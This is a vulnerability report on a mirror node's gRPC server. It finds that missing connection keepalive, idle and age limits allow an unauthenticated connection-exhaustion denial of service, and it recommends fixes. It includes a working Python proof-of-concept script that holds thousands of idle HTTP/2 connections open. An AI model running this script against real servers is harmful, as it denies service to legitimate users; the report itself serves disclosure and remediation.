### Title
Missing Connection Lifecycle Controls in `grpcServerConfigurer()` Enable Unauthenticated Connection Exhaustion DoS

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the Netty gRPC server with only a per-connection call limit, leaving all connection lifecycle parameters at their Netty defaults (`keepAliveTime = Long.MAX_VALUE`, `maxConnectionIdle = Long.MAX_VALUE`, `maxConnectionAge = Long.MAX_VALUE`). An unauthenticated attacker can open a large number of TCP connections, send a valid HTTP/2 client preface to complete the handshake, then go silent indefinitely. Because the server never sends keepalive pings and never closes idle connections, each such connection permanently consumes a Netty `Channel`, pipeline buffers, and an OS file descriptor until the process exhausts its resource limits and can no longer accept new connections.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, lines 28–35 (`grpcServerConfigurer()`):

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, lines 11–15:

```java
public class NettyProperties {
    @Min(1)
    private int maxConcurrentCallsPerConnection = 5;
}
```

No call to any of the following is present anywhere in the grpc module (confirmed by exhaustive search):
- `serverBuilder.keepAliveTime(...)`
- `serverBuilder.keepAliveTimeout(...)`
- `serverBuilder.maxConnectionIdle(...)`
- `serverBuilder.maxConnectionAge(...)`
- `serverBuilder.permitKeepAliveWithoutCalls(...)`

**Root cause and failed assumption:**

The code assumes that `maxConcurrentCallsPerConnection = 5` is sufficient to bound server resource consumption. This assumption is false. That setting limits the number of concurrent RPC calls *per connection*, not the number of connections. Netty gRPC's `NettyServerBuilder` defaults are:

| Parameter | Default |
|---|---|
| `keepAliveTime` | `Long.MAX_VALUE` ns (disabled — server never pings) |
| `keepAliveTimeout` | 20 s (irrelevant since pings are never sent) |
| `maxConnectionIdle` | `Long.MAX_VALUE` (never closes idle connections) |
| `maxConnectionAge` | `Long.MAX_VALUE` (never closes connections by age) |
| Max connections | Unbounded |

Because `keepAliveTime` is effectively infinite, the server never sends HTTP/2 PING frames to probe liveness. Because `maxConnectionIdle` is infinite, connections that send no data after the HTTP/2 preface are never reaped. The OS TCP keepalive (default ~2 hours) is the only backstop, and it is far too slow to mitigate a deliberate attack.

**Exploit flow:**

1. Attacker opens a TCP connection to port 5600.
2. Attacker sends the 24-byte HTTP/2 client connection preface (`PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n`) followed by a SETTINGS frame to complete the HTTP/2 handshake. The server accepts the connection and allocates a full Netty `Channel` + pipeline.
3. Attacker sends no further frames. No RPC call is ever initiated.
4. Server never sends a PING (keepAliveTime = ∞), so it never detects the idle connection.
5. Attacker repeats steps 1–4 in a tight loop from one or more source IPs.
6. Each connection holds: one Netty `Channel` object, associated `ChannelPipeline` with all handlers, read/write buffers, and one OS file descriptor.
7. When the process hits its file-descriptor limit (e.g., `ulimit -n 65535`) or exhausts heap, new `accept()` calls fail and legitimate subscribers cannot connect.

**Why existing checks are insufficient:**

`maxConcurrentCallsPerConnection = 5` is enforced at the gRPC call layer, after the HTTP/2 connection is already established and resources are already allocated. An attacker who never initiates an RPC call is completely unaffected by this limit. There is no connection-count cap, no idle-connection reaper, and no server-initiated liveness probe anywhere in the configuration.

### Impact Explanation
The gRPC server exposes the `ConsensusService/subscribeTopic` streaming RPC, which is the primary interface for clients to receive topic message gossip. A successful connection exhaustion attack renders this endpoint unavailable to all legitimate subscribers for the duration of the attack. The impact is a complete denial of service of the mirror node's gRPC API. Severity is **High**: the service is publicly reachable (port 5600, no authentication required), the attack is cheap to execute (idle TCP connections consume minimal attacker resources), and recovery requires either a process restart or waiting for OS-level TCP keepalive to eventually reap connections (~2 hours by default).

### Likelihood Explanation
The precondition is only network reachability to port 5600 — no credentials, no account, no prior knowledge of the application. The attack is trivially scriptable with standard tools (`hping3`, a simple Python socket loop, or any HTTP/2 client library). It is repeatable and can be sustained indefinitely. The attacker's cost per held connection is one socket file descriptor and negligible CPU; the server's cost is a full Netty channel. The asymmetry strongly favors the attacker. Likelihood is **High**.

### Recommendation
Add the following calls inside the `grpcServerConfigurer()` lambda, with values exposed as configurable properties in `NettyProperties`:

```java
serverBuilder.keepAliveTime(30, TimeUnit.SECONDS);          // server sends PING every 30s
serverBuilder.keepAliveTimeout(10, TimeUnit.SECONDS);       // close if no PING ACK within 10s
serverBuilder.maxConnectionIdle(5, TimeUnit.MINUTES);       // close connections idle > 5 min
serverBuilder.maxConnectionAge(1, TimeUnit.HOURS);          // recycle long-lived connections
serverBuilder.permitKeepAliveWithoutCalls(false);           // do not allow client pings on idle conns
```

Additionally, consider adding a `maxConnections` limit at the infrastructure level (e.g., via the nginx proxy already present in `docker-compose.yml`, using `limit_conn`) to cap total simultaneous connections per source IP.

### Proof of Concept

```python
import socket, time

TARGET_HOST = "mirror-node-grpc-host"
TARGET_PORT = 5600
NUM_CONNECTIONS = 5000

# Minimal HTTP/2 client preface: magic + empty SETTINGS frame
HTTP2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
SETTINGS_FRAME = b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"  # empty SETTINGS

sockets = []
for i in range(NUM_CONNECTIONS):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TARGET_HOST, TARGET_PORT))
        s.sendall(HTTP2_PREFACE + SETTINGS_FRAME)
        sockets.append(s)
        if i % 100 == 0:
            print(f"[+] {i} connections held open")
    except Exception as e:
        print(f"[!] Failed at {i}: {e}")
        break

print(f"[*] Holding {len(sockets)} connections open. Server should now reject new connections.")
# Keep connections open indefinitely — server never closes them
while True:
    time.sleep(60)
```

Expected result: after `NUM_CONNECTIONS` connections are held, new legitimate gRPC clients attempting to connect to port 5600 receive `Connection refused` or `RESOURCE_EXHAUSTED`, and `subscribeTopic` calls fail. The server process's open file descriptor count (`/proc/<pid>/fd`) will be at or near its `ulimit -n` ceiling.
